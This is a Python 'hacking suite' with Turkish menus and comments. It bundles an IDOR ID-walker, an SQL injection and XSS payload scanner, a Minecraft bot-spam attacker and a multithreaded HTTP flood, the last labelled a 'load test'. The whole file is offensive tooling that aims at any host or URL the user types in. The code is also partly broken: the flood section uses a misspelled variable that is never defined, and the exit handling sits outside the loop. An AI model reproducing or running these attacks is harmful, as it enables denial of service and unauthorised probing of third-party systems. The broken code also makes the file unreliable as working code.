import socket
import threading
import time
import requests
import random
from javascript import require

toplam_gonderilen = 0
sayac_kilidi = threading.Lock()
saldiri_devam_ediyor = True

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0"
]

def minecraft_bot_gorevi(bot_adi, hedef_host, hedef_port, sunucu_durumu, sunucu_surumu):
    try:
        mineflayer = require('mineflayer')
        
        bot_ayarlari = {
            'host': hedef_host,
            'port': int(hedef_port),
            'username': bot_adi,
            'version': sunucu_surumu
        }
        
        if sunucu_durumu == 'h':
            bot_ayarlari['auth'] = 'offline'
            
        bot = mineflayer.createBot(bot_ayarlari)
        
        if sunucu_durumu == 'h':
            @bot.once('spawn')
            def on_spawn(this):
                time.sleep(0.5)
                bot.chat("Bot Ordusu Sunucuda reisss SPAM!")
                bot.quit()
                print(f"[+] {bot_adi} iceri daldi ve mesaji birakti!")
        if sunucu_durumu != 'h':
            @bot.on('login')
            def on_login(this):
                bot.quit()
                print(f"[+] {bot_adi} orijinal sunucu kapisini zorladi da!")
                
    except Exception:
        pass
while True:
    print(r"""
  __  __      __      __ __ __________ 

 |  \/  |     \ \    / /_ |___  /  __ \
 | \  / | ___  \ \  / / | |  / /| |  | |
 | |\/| |/ __|  \ \/ /  | | / / | |  | |
 | |  | | (__    \  /   | |/ /__| |__| |
 |_|  |_|\___|    \/    |_/_____/\____/ 
                                       
         [ MrV1zo Hacking Suite ]      
""")
    print("1 -> TRIDOR (IDOR Tarayici)")
    print("2 -> TRSQL (SQL Injection Tarayici)")
    print("3 -> TRXSS (XSS Tarayici)")
    print("4 -> TRBOT (Minecraft Bot Saldirisi)")
    print("5 -> DDOS ATTACKER (Ag Yuk Testi)")
    print("6 -> Cikis Yap amınum")
    
    secim = input("\nYapilacak islemi sec reis (1-6): ")
    
    if secim == "1":
        print(r"""  _______ _____  _____ _____   ____  _____  

 |__   __|  __ \|_   _|  __ \ / __ \|  __ \ 
    | |  | |__) | | | | |  | | |  | | |__) |
    | |  |  _  /  | | | |  | | |  | |  _  / 
    | |  | | \ \ _| |_| |__| | |__| | | \ \ 
    |_|  |_|  \_\_____|_____/ \____/|_|  \_\
                                            
          [ Developed By MrV1zo ]           
""")
        hedef_url = input("Hedef URL'yi girin: ")
        print(f"\n[*] {hedef_url} adresi icin IDOR taramasi baslatiliyor...\n")
        
        istek_basliklari = {
            "User-Agent": random.choice(user_agents),
            "Cookie": "session_id=ORNEK_KIMLIK_DOGRULAMA"
        }
        
        for idor in range(100, 150):
            parametre = {"id": idor}
            try:
                yanit = requests.get(hedef_url, params=parametre, headers=istek_basliklari, timeout=3)
                if yanit.status_code == 200:
                    print(f"[+] Acik olabilME IHTIMALI VAR == ID: {idor} aktif.")
                if yanit.status_code != 200:
                    print(f"[-] ID {idor} erisime kapali. HTTP {yanit.status_code}")
            except requests.exceptions.RequestException:
                print("[-] Sunucuya baglanamadik aminum")
                break
                
        input("\nTarama bitti. Ana menuye donmek icin Enter'a bas reis...")

    if secim == "2":
        print(r"""  _______ _____   _____  ____  _       

 |__   __|  __ \ / ____|/ __ \| |      
    | |  | |__) | | | | |  | | |      
    | |  |  _  / \___ \| |  | | |      
    | |  | | \ \ ____) | |__| | |____  
    |_|  |_|  \_\_____/ \___\_\______| 
                                       
        [ Developed By MrV1zo ]        
""")
        sql_url = input("SQL acigi aranacak site URL'sini girin: ")
        print(f"\n[*] SQL Acigi taramasi yapiliyor...\n")
        
        payloadlar = ["'", '"', "' OR 1=1 --", '" OR 1=1 --']
        hata_kelimeleri = ["sql syntax", "mysql", "mariadb", "postgresql", "oracle", "syntax error"]
        
        for sql in payloadlar:
            parametre = {"id": sql}
            try:
                yanit = requests.get(sql_url, params=parametre, headers={"User-Agent": random.choice(user_agents)}, timeout=3)
                sayfa_icerigi = yanit.text.lower()
                
                acik_var_mi = any(kelime in sayfa_icerigi for kelime in hata_kelimeleri)
                
                if acik_var_mi or yanit.status_code == 500:
                    print(f"[+]Jackpotttt!!! SQL acigi bulundu amk!")
                    print(f"    Calisan Payload: {sql}")
                    break
                if not acik_var_mi and yanit.status_code != 500:
                    print(f"[-] Sql acigi yok kanka gecmis olsun... Payload: {sql}")
            except requests.exceptions.RequestException:
                print("[-] Sunucuya baglanamadik aminum")
                break
                
        input("\nTarama bitti. Ana menuye donmek icin Enter'a bas reis...")
        
    if secim == "3":
        print(r"""
  _______ _____  __   _________  _____ 

 |__   __|  __ \ \ \ / /  ____|/ ____|
    | |  | |__) | \ V /| |__  | (___  
    | |  |  _  /   > < |  __|  \___ \ 
    | |  | | \ \  / . \| |____ ____) |
    |_|  |_|  \_\/_/ \_\______|_____/ 
                                       
          [ Developed By MrV1zo ]      
""")
        xss_url = input("XSS acigi aranacak site URL'sini girin: ")
        payloadlar = [
            "<script>alert(1)</script>",
            '"><script>alert("XSS")</script>',
            "<img src=x onerror=alert(1)>"
        ]
        
        for xss in payloadlar:
            parametre = {"id": xss}
            try:
                yanit = requests.get(xss_url, params=parametre, headers={"User-Agent": random.choice(user_agents)}, timeout=3)
                if xss in yanit.text and "<script>" in yanit.text:
                    print(f"[+] Jackpottt!!!! reisim XSS acigini bulduk vallaha hee")
                    print(f"    Calisan Kod: {xss}")
                    break
                if xss not in yanit.text or "<script>" not in yanit.text:
                    print(f"[-] Kod orada yansimadi veya engellendi. : {xss}")
            except requests.exceptions.RequestException:
                print("[-] Sunucuya baglanamadik reisistan interneti veya URL'yi kontrol et aminum")
                break
                
        input("\nTarama bitti. Ana menuye donmek icin Enter'a bas reis...")
        
    if secim == "4":
        print(r"""
  _______ _____  ____   ____ _______ 

 |__   __|  __ \|  _ \ / __ \__   __|
    | |  | |__) | | _) | |  | | | |   
    | |  |  _  /|  _ <| |  | | | |   
    | |  | | \ \ \| |_) | |__| | | |   
    |_|  |_|  \_\____/ \____/  |_|   
                                     
         [ Developed By MrV1zo ]     
""")
        hedef_host = input("Sunucu IP/Host adresini gir reis: ")
        hedef_port = int(input("Sunucu PORT numarasini gir reis (Orn: 25565): "))
        sunucu_durumu = input("Sunucu ORIJINAL (Crackli Degil) mi? (Evet icin E, Hayir icin H): ").lower()
        sunucu_surumu = input("Sunucu surumunu girin (Orn: 1.16.5, 1.20.1): ")
        bot_ana_isim = input("Botlarin isim kokunu gir reis (Orn: Oyuncu): ")
        bot_sayisi = int(input("Kac tane bot firlatacaksin: "))
        
        print(f"\n[*] {hedef_host}:{hedef_port} adresine {bot_sayisi} bot ile baskın baslatiliyor...\n")
        
        for i in range(1, bot_sayisi + 1):
            isim = f"{bot_ana_isim}_{i}"
            t = threading.Thread(target=minecraft_bot_gorevi, args=(isim, hedef_host, hedef_port, sunucu_durumu, sunucu_surumu))
            t.daemon = True
            t.start()
            time.sleep(0.25)
            
        input("\nBotlar firlatildi. Ana menuye donmek icin Enter'a bas reis...")
        
    if secim == "5":
        def saldiri(hedef_ip, bandwidth_port):
            global toplam_gonderilen, saldiri_devam_ediyor
            while saldiri_devam_ediyor:  
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((hedef_ip, bandwidth_port))
                    yerel_ip, yerel_port = s.getsockname()
                    rastgele_ua = random.choice(user_agents)
                    http_istegi = f"GET / HTTP/1.1\r\nHost: {hedef_ip}\r\nUser-Agent: {rastgele_ua}\r\nConnection: keep-alive\r\n\r\n"
                    http_bytes = http_istegi.encode('utf-8')
                    s.send(http_bytes)
                    s.close()
                    with sayac_kilidi:
                        toplam_gonderilen += 1
                        guncel_sayac = total_gonderilen
                    print(f"[PACKET-ID: {guncel_sayac}] [SRC: {yerel_ip}:{yerel_port}] ===> [TARGET: {hedef_ip}:{bandwidth_port}] [SIZE: {len(http_bytes)} bytes] [STATUS: SENT]")
                    time.sleep(0.001)
                except Exception:
                    print(f"[WARNING] [TARGET: {hedef_ip}:{bandwidth_port}] [STATUS: CONNECTION_TIMEOUT / REFUSED]")
                    time.sleep(0.2)

        def gosterge_paneli(baslangic_zamani, saldiri_suresi):
            global saldiri_devam_ediyor
            while saldiri_devam_ediyor:
                gecen_sure = int(time.time() - baslangic_zamani)
                kalan_sure = saldiri_suresi - gecen_sure
                if kalan_sure <= 0:
                    saldiri_devam_ediyor = False
                    break
                time.sleep(1)

        print(r"""
  _____  _____   ____   _____           _______ _______       _____ _  ________ _____  

 |  __ \|  __ \ / __ \ / ____|   /\    |__   __|__   __|/\   / ____| |/ /  ____|  __ \ 
 | |  | | |  | | |  | | (___    /  \      | |     | |  /  \ | |    | ' /| |__  | |__) |
 | |  | | |  | | |  | |\___ \  / /\ \     | |     | | / /\ \| |    |  < |  __| |  _  / 
 | |__| | |__| | |__| |____) |/ ____ \    | |     | |/ ____ \ |___| . \| |____| | \ \ 
 |_____/|_____/ \____/|_____//_/    \_\   |_|     |_/_/    \_\_____|_|\_\______|_|  \_\
""")
        hedef_host_girisi = input("Test edilecek hedef IP veya Domain adresini girin: ")
        bandwidth_port = int(input("Port numarasini girin (Orn: 80 veya 443): "))
        saldiri_suresi = int(input("Yuk testi suresi (Saniye): "))
        thread_sayisi = int(input("Thread (Kanal) sayisini girin (Orn: 50): "))
        
        try:
            hedef_ip = socket.gethostbyname(hedef_host_girisi)
            print(f"[+] Domain Cozuldu -> Hedef IP: {hedef_ip}")
        except socket.gaierror:
            hedef_ip = hedef_host_girisi
            print(f"[*] IP adresi dogrudan kabul edildi: {hedef_ip}")
            
        toplam_gonderilen = 0
        saldiri_devam_ediyor = True
        baslangic_zamani = time.time()
        
        print(f"\n[*] {hedef_ip}:{bandwidth_port} uzerinde canli veri akisi baslatildi...\n")
        
        for _ in range(thread_sayisi):
            t = threading.Thread(target=saldiri, args=(hedef_ip, bandwidth_port))
            t.daemon = True
            t.start()
            
        gosterge_paneli(baslangic_zamani, saldiri_suresi)
        saldiri_devam_ediyor = False
        print(f"\n\n[+] Yuk testi tamamlandi. Toplam Basarili Paket: {toplam_gonderilen}")
input("\nAna menuye donmek icin Enter'a bas reis...")

if secim == "6":
    print("\n[+] Suite kapatiliyor amınum. Eline saglik reis!")
    break

if secim != "1" and secim != "2" and secim != "3" and secim != "4" and secim != "5" and secim != "6":
    input("\nGecersiz secim yaptin amınum. Yeniden denemek icin Enter'a bas...")